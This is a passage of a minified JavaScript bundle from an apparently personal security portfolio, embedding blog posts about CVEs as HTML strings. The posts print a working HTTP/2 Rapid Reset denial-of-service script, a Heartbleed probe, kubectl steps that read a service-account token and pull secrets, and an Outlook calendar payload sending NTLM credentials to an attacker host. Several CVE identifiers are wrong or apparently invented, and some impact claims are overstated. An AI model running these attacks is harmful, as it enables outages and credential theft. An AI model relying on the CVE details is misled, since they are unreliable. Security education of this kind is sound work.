design",stack:["Desktop","Sandbox"]},"Secure Communication Using Image Exif Data":{code:"EXIF",status:"RESEARCH",metric:"covert channel paper",stack:["Image","Crypto","Steganography"]},"Architecture and Advancement in Virtualization of TPM":{code:"vTPM",status:"RESEARCH",metric:"research paper",stack:["Virtualization","TPM","Cloud"]},"Quantum Key Distribution":{code:"QKD",status:"RESEARCH",metric:"QKD distance study",stack:["Quantum","Crypto"]},"SecTool: The Comprehensive Cybersecurity Toolkit":{code:"SEC",status:"SHIPPED",metric:"all-in-one toolkit",stack:["Python","Toolkit"]},"Website Crawler":{code:"WCR",status:"SHIPPED",metric:"scraping utility",stack:["Python","Web"]},ShellScribe:{code:"SHL",status:"ACTIVE",metric:"policy-gated runner",stack:["Python","Plugin","CLI"]}},Kl=Nd.map(e=>{const n=e.details.match(/by\s+([A-Za-z0-9\s\-&/]+?)(?:\s*-|\s*$)/),t=e.details.match(/(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d{4}/);return{title:e.title,iss:e.issuer||(n?n[1].trim():"—"),y:t?t[0]:"—",href:e.href}});function Cm(){const e=n=>n.toUpperCase().includes("CVE");return me.filter(n=>e(n.title)).map(n=>{const t=n.title.match(/CVE[-–](\d{4})[-–]?(\d+)/i),s=t?`CVE-${t[1]}-${t[2]}`:n.slug.toUpperCase(),a=t?t[1]:(n.date.match(/\d{4}/)||["—"])[0],r=(n.excerpt.split(/[.,]/)[0]||"Unknown").slice(0,40);return{id:s,target:r,class:n.category||"Unknown",year:a,role:"study",slug:n.slug}})}const kt=Cm(),Yl=Tm.map(e=>({label:e.label,href:e.href,handle:e.label==="GitHub"?"@Hem1700":e.label==="LinkedIn"?"/in/hem-parekh":e.label==="Medium"?"@hemparekh1596":e.label==="TryHackMe"?"/p/beatmonk":e.label==="HackTheBox"?"/profile":"—"})),Pm={app:"Apps",post:"Writing",project:"Projects",cve:"CVEs"},Am=["app","post","project","cve"];function Nm(e,n){if(!n)return 0;const t=n.toLowerCase(),s=(e.title||"").toLowerCase(),a=(e.body||"").toLowerCase();let r=0;s===t?r+=100:s.startsWith(t)?r+=60:s.includes(t)&&(r+=40),a.includes(t)&&(r+=12);for(const i of t.split(/\s+/).filter(Boolean))s.includes(i)&&(r+=4),a.includes(i)&&(r+=1);return r}function jd({onClose:e,onLaunch:n,onOpenPost:t,onRunCveCommand:s}){const[a,r]=w.useState(""),[i,l]=w.useState(0),c=w.useMemo(()=>{const k=Ad.map(h=>{var x;return{type:"app",title:xe[h].title,subtitle:((x=xe[h].title.split("—")[1])==null?void 0:x.trim())||"",body:xe[h].title,action:()=>n(h),g:xe[h].g}}),y=me.map(h=>({type:"post",title:h.title,subtitle:`${h.date} · ${h.readTime} · ${h.category}`,body:`${h.excerpt||""} ${h.category||""}`,action:()=>t(h.slug),g:"g-notes"})),S=Nn.map(h=>{const x=Ct[h.title]||{};return{type:"project",title:h.title,subtitle:[x.code,x.status,(h.tags||[]).join(" / ")].filter(Boolean).join(" · "),body:`${h.description||""} ${(h.tags||[]).join(" ")} ${(x.stack||[]).join(" ")} ${x.code||""}`,action:()=>n("files",{selectedTitle:h.title}),g:"g-files"}}),d=me.filter(h=>h.title.toUpperCase().includes("CVE")).map(h=>{const x=h.title.match(/CVE[-–](\d{4})[-–]?(\d+)/i),b=x?`CVE-${x[1]}-${x[2]}`:h.slug.toUpperCase();return{type:"cve",title:`${b} — ${h.title.replace(/^CVE[-–\d]+/i,"").trim()}`,subtitle:`${h.date} · ${h.category}`,body:`${h.excerpt||""} ${h.category||""} ${b}`,action:()=>s(b),g:"g-term"}});return[...k,...y,...S,...d]},[n,t,s]),u=w.useMemo(()=>{const k=["finder","notes","terminal"].map(S=>c.find(m=>m.type==="app"&&m.title===xe[S].title)).filter(Boolean),y=c.filter(S=>S.type==="post").slice(0,3);return[...k,...y]},[c]),f=w.useMemo(()=>a.trim()?c.map(k=>({item:k,s:Nm(k,a)})).filter(k=>k.s>0).sort((k,y)=>y.s-k.s).slice(0,12).map(k=>k.item):u,[a,c,u]),p=w.useMemo(()=>{const k={};return f.forEach(y=>{var S;(k[S=y.type]||(k[S]=[])).push(y)}),Am.filter(y=>{var S;return(S=k[y])==null?void 0:S.length}).map(y=>({type:y,label:Pm[y],items:k[y]}))},[f]),g=p.flatMap(k=>k.items),v=k=>{if(k.key==="Escape")e();else if(k.key==="ArrowDown")k.preventDefault(),l(y=>Math.min(g.length-1,y+1));else if(k.key==="ArrowUp")k.preventDefault(),l(y=>Math.max(0,y-1));else if(k.key==="Enter"){const y=g[i];y&&(y.action(),e())}};return o.jsxs("div",{className:"spotlight",onClick:k=>k.stopPropagation(),children:[o.jsx("input",{autoFocus:!0,placeholder:"Search apps, posts, projects, CVEs…",value:a,onChange:k=>{r(k.target.value),l(0)},onKeyDown:v}),!a.trim()&&o.jsxs("div",{className:"sp-hint",children:[o.jsx("span",{children:"↑↓ navigate"}),o.jsx("span",{children:"↵ open"}),o.jsx("span",{children:"esc close"})]}),o.jsxs("div",{className:"rs",children:[p.length===0&&o.jsx("div",{className:"re",children:o.jsxs("div",{className:"ttl",style:{color:"var(--mut)"},children:['no results for "',a,'"']})}),p.map(k=>o.jsxs("div",{children:[o.jsx("div",{className:"sp-group",children:k.label}),k.items.map(y=>{const S=g.indexOf(y);return o.jsxs("div",{className:`re ${S===i?"on":""}`,onClick:()=>{y.action(),e()},onMouseEnter:()=>l(S),children:[o.jsx("div",{className:`ic ${y.g}`}),o.jsxs("div",{style:{flex:1,minWidth:0},children:[o.jsx("div",{className:"ttl",children:y.title}),y.subtitle&&o.jsx("div",{className:"typ",children:y.subtitle})]})]},`${k.type}-${y.title}`)})]},k.type))]})]})}const Mm=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–0012?</h2>
        <p>
          CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.
        </p>

        <h2>How the Vulnerability Works</h2>
        <h3>HTTP/2 and RST_STREAM</h3>
        <p>
          HTTP/2 allows multiplexing multiple streams over a single connection. The RST_STREAM frame cancels streams when they are no longer needed. However, attackers can send a rapid series of RST_STREAM frames, forcing the server to process and discard streams at an unsustainable rate, leading to resource exhaustion.
        </p>

        <h2>Exploit Code Example</h2>
        <p>
          Below is an educational example in Python that demonstrates how an attacker could exploit this vulnerability using an HTTP/2 library.
        </p>
        <div class="code-block">
          <code>
import h2.connection<br>
import h2.events<br>
import socket<br>
import ssl<br>
import time<br><br>

# Configure target server<br>
TARGET_HOST = "vulnerable-server.com"<br>
TARGET_PORT = 443<br>
STREAM_COUNT = 1000  # Number of streams to abuse<br><br>

def send_reset_attack():<br>
    # Establish SSL/TLS connection<br>
    context = ssl.create_default_context()<br>
    with socket.create_connection((TARGET_HOST, TARGET_PORT)) as raw_sock:<br>
        with context.wrap_socket(raw_sock, server_hostname=TARGET_HOST) as tls_sock:<br>
            # Initialize HTTP/2 connection<br>
            conn = h2.connection.H2Connection()<br>
            conn.initiate_connection()<br>
            tls_sock.sendall(conn.data_to_send())<br><br>

            # Send multiple streams with rapid resets<br>
            for stream_id in range(1, STREAM_COUNT * 2, 2):  # HTTP/2 streams are odd-numbered<br>
                conn.send_headers(<br>
                    stream_id=stream_id,<br>
                    headers=[<br>
                        (":method", "GET"),<br>
                        (":path", "/"),<br>
                        (":authority", TARGET_HOST),<br>
                        (":scheme", "https"),<br>
                    ],<br>
                )<br>
                tls_sock.sendall(conn.data_to_send())<br>
                conn.reset_stream(stream_id)<br>
                tls_sock.sendall(conn.data_to_send())<br>
                print(f"Stream {stream_id} reset sent")<br>
            time.sleep(5)<br><br>

if __name__ == "__main__":<br>
    print(f"Launching HTTP/2 Rapid Reset Attack on {TARGET_HOST}...")<br>
    send_reset_attack()<br>
    print("Attack complete. Check server performance.")<br>
          </code>
        </div>
        <p><strong>Disclaimer:</strong> This code is for educational purposes only. Testing such exploits without proper authorization is unethical and illegal.</p>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Server Patches:</strong> Server vendors like Apache and Nginx have released patches to mitigate this vulnerability. Update your software to the latest version.</li>
          <li><strong>Implement Rate-Limiting:</strong> Use rate-limiting to restrict the number of HTTP/2 streams and resets per connection.</li>
          <li><strong>Monitor Server Metrics:</strong> Deploy monitoring tools to detect unusual spikes in resource usage associated with HTTP/2 traffic.</li>
          <li><strong>Disable HTTP/2 Temporarily:</strong> If patching is not feasible, disable HTTP/2 support as a temporary mitigation:
            <ul>
              <li><strong>For Apache:</strong> Remove <code>h2</code> from the <code>Protocols</code> directive:</li>
              <code>Protocols h2 h2c http/1.1</code>
              <li><strong>For Nginx:</strong> Remove the <code>http2</code> directive from server configurations.</li>
            </ul>
          </li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–0012, or the HTTP/2 Rapid Reset Attack, underscores the importance of securing web servers against denial-of-service attacks. By applying timely patches, implementing rate-limiting, and monitoring server activity, organizations can mitigate this threat and ensure the availability of their services.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,jm=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Heartbleed (CVE-2014–0160)</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Heartbleed (CVE-2014–0160)</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>Understanding Heartbleed: A Technical Breakdown</h2>
        <p>
          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
        </p>

        <h3>Heartbeat Extension Basics</h3>
        <p>
          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
        </p>
        <ol>
          <li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
          <li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
        </ol>
        <p>
          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
        </p>

        <h3>Simplified Vulnerable Code</h3>
        <div class="code-block">
          <code>
int tls1_process_heartbeat(SSL *s) {<br />
&nbsp;&nbsp;unsigned char *p = &s->s3->rrec.data[0];<br />
&nbsp;&nbsp;unsigned short payload;<br />
&nbsp;&nbsp;unsigned char *buffer, *bp;<br />
&nbsp;&nbsp;payload = (p[0] << 8) | p[1];<br />
&nbsp;&nbsp;buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br />
&nbsp;&nbsp;bp = buffer;<br />
&nbsp;&nbsp;*bp++ = TLS1_HB_RESPONSE;<br />
&nbsp;&nbsp;memcpy(bp, p, payload); // Vulnerable<br />
&nbsp;&nbsp;ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br />
&nbsp;&nbsp;OPENSSL_free(buffer);<br />
}
          </code>
        </div>

        <h2>How Heartbleed Works</h2>
        <p>
          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
        </p>

        <h3>Exploit Example in Python</h3>
        <div class="code-block">
          <code>
import socket<br />
import struct<br />
def create_heartbeat_request():<br />
&nbsp;&nbsp;hb_type = 1<br />
&nbsp;&nbsp;payload = b"Hi"<br />
&nbsp;&nbsp;payload_length = 0xFFFF<br />
&nbsp;&nbsp;return struct.pack(">BHH", hb_type, len(payload), payload_length) + payload<br />
def send_heartbeat_request(host, port):<br />
&nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
&nbsp;&nbsp;s.connect((host, port))<br />
&nbsp;&nbsp;s.send(create_heartbeat_request())<br />
&nbsp;&nbsp;response = s.recv(65535)<br />
&nbsp;&nbsp;print("Leaked memory:", response)<br />
send_heartbeat_request("example.com", 443)
          </code>
        </div>

        <h2>Global Chaos and Real-World Impact</h2>
        <p>
          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
        </p>

        <h2>Detecting Heartbleed</h2>
        <p>
          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
        </p>
        <div class="code-block">
          <code>
nmap -p 443 --script ssl-heartbleed example.com
          </code>
        </div>

        <h2>Lessons Learned</h2>
        <ul>
          <li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
          <li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
          <li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
        </ul>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Im=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–1001: Kubernetes RBAC Misconfiguration</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–1001: Kubernetes RBAC Misconfiguration</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–1001?</h2>
        <p>
          Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.
        </p>

        <h3>RBAC in Kubernetes</h3>
        <p>
          RBAC allows administrators to define who can access resources in a Kubernetes cluster and what actions they can perform. Permissions are granted using Roles, Cluster Roles, and Role Bindings.
        </p>

        <h2>The Vulnerability</h2>
        <p>
          CVE-2024–1001 occurs when overly permissive RBAC configurations allow attackers to escalate privileges. Specifically:
        </p>
        <ul>
          <li>Permissions like “create” or “patch” on sensitive resources (e.g., Pods) can be abused.</li>
          <li>Attackers can deploy malicious workloads, extract secrets, or control the cluster API server.</li>
        </ul>

        <h2>Exploit Workflow</h2>
        <h3>RBAC Misconfiguration</h3>
        <div class="code-block">
          <code>
apiVersion: rbac.authorization.k8s.io/v1<br>
kind: Role<br>
metadata:<br>
&nbsp;&nbsp;namespace: vulnerable-namespace<br>
&nbsp;&nbsp;name: overly-permissive-role<br>
rules:<br>
- apiGroups: [""]<br>
&nbsp;&nbsp;resources: ["pods", "secrets"]<br>
&nbsp;&nbsp;verbs: ["get", "create", "patch"]<br>
          </code>
        </div>
        <p>This Role allows anyone bound to it to create and patch Pods and access secrets in the namespace.</p>

        <h3>Step-by-Step Exploit</h3>
        <ol>
          <li><strong>Gain Initial Access:</strong> Assume the attacker has access to a low-privileged service account in the namespace, bound to the misconfigured Role.</li>
          <li><strong>Create a Malicious Pod:</strong> Use the <code>kubectl</code> command to create a Pod with elevated privileges:
            <div class="code-block">
              <code>
kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
              </code>
            </div>
          </li>
          <li><strong>Access Sensitive Secrets:</strong> Once the Pod is running, exec into it:
            <div class="code-block">
              <code>
kubectl exec -it malicious-pod -- /bin/sh<br>
# Inside the Pod:<br>
curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\ <br>
https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
              </code>
            </div>
          </li>
          <li><strong>Escalate Privileges:</strong> Create Pods with privileged containers:
            <div class="code-block">
              <code>
kubectl apply -f - <<EOF<br>
apiVersion: v1<br>
kind: Pod<br>
metadata:<br>
&nbsp;&nbsp;name: root-access-pod<br>
&nbsp;&nbsp;namespace: kube-system<br>
spec:<br>
&nbsp;&nbsp;containers:<br>
&nbsp;&nbsp;- name: root-access-container<br>
&nbsp;&nbsp;&nbsp;&nbsp;image: alpine<br>
&nbsp;&nbsp;&nbsp;&nbsp;securityContext:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;privileged: true<br>
&nbsp;&nbsp;&nbsp;&nbsp;command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br>
EOF
              </code>
            </div>
          </li>
        </ol>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Enforce the Principle of Least Privilege:</strong> Grant only the minimum permissions necessary for users and service accounts to perform their tasks. Avoid broad permissions like “create” or “patch” on sensitive resources.</li>
          <li><strong>Audit RBAC Policies:</strong> Regularly audit your RBAC configurations to identify overly permissive Roles and ClusterRoles:
            <div class="code-block">
              <code>
kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
              </code>
            </div>
          </li>
          <li><strong>Use Pod Security Standards:</strong> Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
            <div class="code-block">
              <code>
apiVersion: policy/v1beta1<br>
kind: PodSecurityPolicy<br>
metadata:<br>
&nbsp;&nbsp;name: restricted<br>
spec:<br>
&nbsp;&nbsp;privileged: false
              </code>
            </div>
          </li>
          <li><strong>Enable Logging and Monitoring:</strong> Monitor for suspicious activities, such as unauthorized Pod creation or access to secrets. Tools like Falco or Kubernetes Audit Logs can help.</li>
          <li><strong>Use Network Policies:</strong> Restrict Pod-to-Pod communication using Kubernetes Network Policies to limit the attack surface.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–1001 underscores the importance of careful RBAC configuration in Kubernetes. Misconfigured permissions can open the door to attackers, allowing them to escalate privileges and take over a cluster. By enforcing least privilege, auditing RBAC policies, and using Pod Security Standards, organizations can safeguard their Kubernetes environments.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,qm=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2017–11882?</h2>
        <p>
          CVE-2017–11882 is a critical vulnerability within Microsoft Office’s Equation Editor component. This legacy feature, designed for displaying mathematical equations, contains a memory corruption flaw that lets attackers execute malicious code when users open a specially crafted document. Attackers can exploit this weakness to install malware, steal data, or gain full control over a target system with the same permissions as the user.
        </p>

        <h3>Affected Office Versions:</h3>
        <ul>
          <li>Microsoft Office 2007 (Service Pack 3)</li>
          <li>Microsoft Office 2010 (Service Pack 2)</li>
          <li>Microsoft Office 2013 (Service Pack 1)</li>
          <li>Microsoft Office 2016</li>
        </ul>
        <p>
          Despite being patched in November 2017, the Equation Editor vulnerability remains a key target, with unpatched systems or older Office versions still vulnerable.
        </p>

        <h2>How the Vulnerability Works</h2>
        <p>
          This vulnerability allows remote code execution (RCE) by corrupting memory through Office’s Object Linking and Embedding (OLE) feature when opening a malicious document. Here’s how an attack typically unfolds:
        </p>
        <ol>
          <li><strong>Phishing:</strong> The attacker sends an email with an attachment, like a Word or Excel document, designed to exploit CVE-2017–11882.</li>
          <li><strong>User Action:</strong> The user opens the document, unknowingly triggering malicious code within the Equation Editor.</li>
          <li><strong>System Compromise:</strong> The attacker gains control over the system, potentially installing further malware, stealing sensitive data, or using the compromised system to attack other network resources.</li>
        </ol>

        <h2>Why CVE-2017–11882 Remains a Top Target</h2>
        <p>
          This vulnerability is highly favored by cybercriminals and nation-state hackers from countries like China, Russia, and North Korea. Both the Department of Homeland Security and the FBI have flagged it as a frequently exploited vulnerability. Its persistence can be attributed to:
        </p>
        <ul>
          <li><strong>Ease of Exploitation:</strong> Attackers only need to convince users to open a document, making social engineering attacks highly effective.</li>
          <li><strong>Legacy Code:</strong> The Equation Editor, dating back to 2000, is incompatible with modern Office security features, making it difficult to defend without patching.</li>
          <li><strong>Prevalence of Unpatched Systems:</strong> Many organizations, particularly those with older Office versions, haven’t applied Microsoft’s 2017 patch, leaving them vulnerable.</li>
        </ul>

        <h2>How to Protect Against CVE-2017–11882</h2>
        <p>
          With patches readily available, mitigating CVE-2017–11882 is straightforward, yet it requires proactive security practices. Here’s how organizations can protect themselves:
        </p>
        <ol>
          <li><strong>Update Microsoft Office:</strong> Ensure all Office versions are up-to-date with Microsoft’s security patches. Microsoft’s November 2017 patch addresses CVE-2017–11882 and should be applied immediately to unpatched systems.</li>
          <li><strong>Disable the Equation Editor:</strong> If this feature is unnecessary for your organization, disable it. Doing so removes a significant attack vector.</li>
          <li><strong>Use Modern Endpoint Protection:</strong> Employ advanced endpoint security tools that can detect and block malicious document activity. Many modern security solutions offer protections specifically designed to detect CVE-2017–11882 exploitation.</li>
          <li><strong>User Awareness and Training:</strong> Social engineering plays a significant role in the success of attacks exploiting this vulnerability. Educate users on the risks of opening unknown attachments or clicking links in unsolicited emails.</li>
        </ol>

        <h2>Staying Ahead of Persistent Threats</h2>
        <p>
          The continued exploitation of CVE-2017–11882 underscores the importance of regular patching, user education, and layered security defenses. A vulnerability like this, embedded in software many organizations rely on daily, is a stark reminder that cybersecurity requires constant vigilance.
        </p>
        <p>
          By applying patches, disabling unused features, and maintaining a robust security posture, organizations can effectively protect themselves against even the oldest and most persistent threats in today’s digital landscape. In cybersecurity, diligence, and preparedness are the best defenses against exploitation — whether it’s a vulnerability from yesterday or one that emerges tomorrow.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Rm=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>How CVE-2023–23397 Works</h2>
        <p>
          The vulnerability exploits how Microsoft Outlook handles reminders and calendar invites. Normally, Outlook processes these items to display notifications and updates. However, in this case, attackers can create a specially crafted message that tricks Outlook into making an outbound connection to a server under the attacker’s control. This connection is made using NTLM authentication, sending the victim’s NTLM credentials and exposing them to potential misuse.
        </p>

        <h3>Exploit Scenario</h3>
        <ol>
          <li>An attacker crafts a malicious email containing a reminder or calendar invite.</li>
          <li>The email specifies a UNC (Universal Naming Convention) path that points to an attacker-controlled server.</li>
          <li>When Outlook receives and processes this email, it automatically tries to access the specified UNC path, triggering NTLM authentication and sending the victim’s credentials to the attacker.</li>
        </ol>

        <h3>Code and Example</h3>
        <div class="code-block">
          <code>
import http.server<br>
import socketserver<br><br>
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):<br>
&nbsp;&nbsp;&nbsp;&nbsp;def do_GET(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Received connection from: {self.client_address}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.send_response(200)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.end_headers()<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.wfile.write(b"Hello, you've been logged!")<br><br>
PORT = 8000<br>
handler = MyRequestHandler<br>
with socketserver.TCPServer(("", PORT), handler) as httpd:<br>
&nbsp;&nbsp;&nbsp;&nbsp;print(f"Serving on port {PORT}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;httpd.serve_forever()<br>
          </code>
        </div>

        <h3>Malicious Email Payload Example</h3>
        <div class="code-block">
          <code>
BEGIN:VCALENDAR<br>
VERSION:2.0<br>
BEGIN:VEVENT<br>
UID:123456<br>
SUMMARY:Malicious Reminder<br>
DTSTART;TZID=Europe/London:20231105T090000<br>
ATTACH;VALUE=URI:\\\\attacker-controlled-server.com\\malicious\\path<br>
END:VEVENT<br>
END:VCALENDAR<br>
          </code>
        </div>

        <h2>Impact and Risks</h2>
        <ul>
          <li><strong>Credential Theft:</strong> If an attacker successfully captures NTLM credentials, they can use them to authenticate against other systems on the same network, potentially gaining unauthorized access.</li>
          <li><strong>No User Interaction Needed:</strong> The lack of user interaction makes this vulnerability particularly dangerous, as even vigilant users can fall victim without realizing it.</li>
          <li><strong>Enterprise Threat:</strong> Organizations with a large number of Outlook users are especially at risk, as the exploit can be used to pivot through corporate networks.</li>
        </ul>

        <h2>Mitigation Strategies</h2>
        <ol>
